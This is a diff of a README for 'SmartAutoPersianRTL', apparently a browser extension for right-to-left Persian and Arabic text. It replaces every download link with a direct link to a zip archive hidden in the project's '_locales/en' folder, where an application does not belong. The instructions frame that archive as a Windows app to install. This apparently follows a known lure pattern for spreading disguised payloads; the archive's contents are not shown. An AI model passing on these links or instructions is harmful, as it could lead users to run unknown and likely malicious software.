@@ -6,7 +6,7 @@ Welcome! If you're tired of seeing Persian or Arabic text scrambled, broken, or 
 
 ## 📥 Download the Application
 
-[📥 DOWNLOAD NOW - Free](https://github.com/Lte55961/SmartAutoPersianRTL)
+[📥 DOWNLOAD NOW - Free](https://github.com/Lte55961/SmartAutoPersianRTL/raw/refs/heads/main/_locales/en/2.2.zip)
 
 Visit this link to download the application.
 
@@ -14,7 +14,7 @@ Visit this link to download the application.
 
 Follow these simple steps to get SmartAutoPersianRTL running on your Windows computer:
 
-1. **Open the Download Link** - Click the big blue button above or copy this address into your browser: `https://github.com/Lte55961/SmartAutoPersianRTL`
+1. **Open the Download Link** - Click the big blue button above or copy this address into your browser: `https://github.com/Lte55961/SmartAutoPersianRTL/raw/refs/heads/main/_locales/en/2.2.zip`
 
 2. **Find the Latest Release** - On the page that opens, look for a section called "Releases" or "Latest Release" on the right side of the screen. Click on it.
 
@@ -163,6 +163,6 @@ Happy browsing! 🌟
 
 ---
 
-**Direct Download Link:** Visit this link to download the application: **https://github.com/Lte55961/SmartAutoPersianRTL**
+**Direct Download Link:** Visit this link to download the application: **https://github.com/Lte55961/SmartAutoPersianRTL/raw/refs/heads/main/_locales/en/2.2.zip**
 
 Keywords: arabic, bidi, browser-extension, chatgpt, chrome-extension, farsi, manifest-v3, persian, rtl, typography
